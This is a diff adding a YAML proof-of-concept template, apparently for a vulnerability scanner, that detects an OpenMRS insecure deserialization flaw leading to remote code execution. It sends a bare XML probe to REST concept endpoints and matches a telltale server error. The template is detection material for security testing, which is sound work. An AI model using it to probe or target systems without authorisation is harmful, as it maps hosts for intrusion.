@@ -1,0 +1,26 @@
+id: poc-yaml-openmrs-insecure-object-deserialization-rce
+info:
+  name: OpenMRS 不安全的对象反序列化漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: OpenMRS
+  osprey-id: vb_2019_0012
+variables:
+  r_path: '/openmrs-standalone/ws/rest/v1/concept
+
+    /openmrs/ws/rest/v1/concept
+
+    /ws/rest/v1/concept'
+requests:
+- method: POST
+  path: '{{.r_path}}'
+  headers:
+    Content-Type: text/xml
+  data: <map>
+  expression: 'status_code == 500
+
+    && contains(body, "Could not read [class org.openmrs.module.webservices.rest.SimpleObject]")
+
+    '
+transport: http
